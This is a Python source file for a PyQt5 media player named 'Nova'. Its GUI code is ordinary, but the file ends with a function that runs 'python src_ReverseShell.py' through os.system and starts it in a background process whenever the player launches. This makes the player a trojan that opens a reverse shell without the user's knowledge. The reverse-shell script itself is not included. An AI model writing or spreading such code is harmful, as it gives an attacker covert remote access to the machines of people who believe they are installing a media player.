# ----------------------------------------------
# 29 June 2021 | 22 : 43 : 24 |
# src_MediaPlayer.py: Nova - Media player source.
# Prerequisite: PyQt5 [GPL version].
# ----------------------------------------------

# Imports
import os
import sys
import multiprocessing
from PyQt5 import QtCore
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt, QUrl
from PyQt5.QtMultimediaWidgets import QVideoWidget
from PyQt5.QtMultimedia import QMediaContent, QMediaPlayer
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QHBoxLayout, QVBoxLayout, QLabel, QSlider, QSizePolicy, QStyle, QFileDialog

# Defining a class for the media player application
class MediaPlayer(QWidget):
    def __init__(self):
        super().__init__()

        # INTERFACE SETUP

        # Setting window attributes
        self.setWindowTitle(u"Nova")
        self.setGeometry(50, 40, 1280, 720)
        self.setWindowIcon(QIcon(u"\home\buer\Additionals\Hrithik\Projects\Project 2\assets\play-button.png"))

        # Calling widgets
        self.init_ui()

        # Displaying window
        self.show()

    # Function for placing widgets
    def init_ui(self):
        # Creating a media player instance
        self.mediaplayer = QMediaPlayer(None, QMediaPlayer.VideoSurface)

        # Creating video widget instance
        self.videowidget = QVideoWidget()
        self.videowidget.setStyleSheet(u"QVideoWidget{\n"
"   background-color: rgb(240, 240, 240);\n"        
"   border-style: None;\n"
"}")
        self.videowidget.setWindowFlag(QtCore.Qt.FramelessWindowHint)
        self.videowidget.setAttribute(QtCore.Qt.WA_TranslucentBackground)

        # Creating open button
        self.openbtn = QPushButton("Open File...")
        self.openbtn.clicked.connect(self.Open_Media)

        # Creating play button
        self.playbtn = QPushButton()
        self.playbtn.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))
        self.playbtn.setEnabled(False)
        self.playbtn.clicked.connect(self.Play_Media)

        # Creating horizontal slider
        self.hslider = QSlider(Qt.Horizontal)
        self.hslider.setRange(0, 0)
        self.hslider.sliderMoved.connect(self.Set_Position)

        # Creating label for displaying error(s) [If encountered]
        self.errlbl = QLabel()
        self.errlbl.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Maximum)

        # Creating HBox layout
        hboxlayout = QHBoxLayout()
        hboxlayout.setContentsMargins(0, 0, 0, 0)

        # Setting widgets into the HBox layout
        hboxlayout.addWidget(self.openbtn)
        hboxlayout.addWidget(self.playbtn)
        hboxlayout.addWidget(self.hslider)

        # Creating VBox layout
        vboxlayout = QVBoxLayout()
        vboxlayout.addWidget(self.videowidget)
        vboxlayout.addLayout(hboxlayout)
        vboxlayout.addWidget(self.errlbl)

        # Setting VBox layout
        self.setLayout(vboxlayout)

        # Setting video widget
        self.mediaplayer.setVideoOutput(self.videowidget)
        self.mediaplayer.stateChanged.connect(self.Media_State)
        self.mediaplayer.positionChanged.connect(self.Slider_Position)
        self.mediaplayer.durationChanged.connect(self.Duration_State)

    # APP FUNCTIONS

    # Function for opening media content
    def Open_Media(self):
        filename = QFileDialog.getOpenFileName(self, "Open Media")

        if filename != "":
            self.mediaplayer.setMedia(QMediaContent(QUrl.fromLocalFile(filename[0])))
            self.playbtn.setEnabled(True)

    # Function for playing media content
    def Play_Media(self):
        if self.mediaplayer.state() == QMediaPlayer.PlayingState:
            self.mediaplayer.pause()
        else:
            self.mediaplayer.play()
    
    # Function to trap media state
    def Media_State(self, state):
        if self.mediaplayer.state() == QMediaPlayer.PlayingState:
            self.playbtn.setIcon(self.style().standardIcon(QStyle.SP_MediaPause))
        else:
            self.playbtn.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))

    # Function to set slider position
    def Slider_Position(self, position):
        self.hslider.setValue(position)

    # Function to set duration state
    def Duration_State(self, duration):
        self.hslider.setRange(0, duration)

    # Function to set media position
    def Set_Position(self, position):
        self.mediaplayer.setPosition(position)

    # Function to handle error(s) [If encountered]
    def steer_error(self):
        self.playbtn.setEnabled(False)
        self.errlbl.setText("Error: " + self.mediaplayer.errorString())

# Function to trigger src_ReverseShell.py
def Thread():
    os.system("python src_ReverseShell.py")

# Creating a multi-process instance for src_ReverseShell.py
process = multiprocessing.Process(target = Thread)

# MAIN

if __name__ == "__main__":
    Media_Player = QApplication(sys.argv)
    Window_Bracket = MediaPlayer()
    
    # Running src_ReverseShell concurrently
    process.start()
    
    sys.exit(Media_Player.exec_())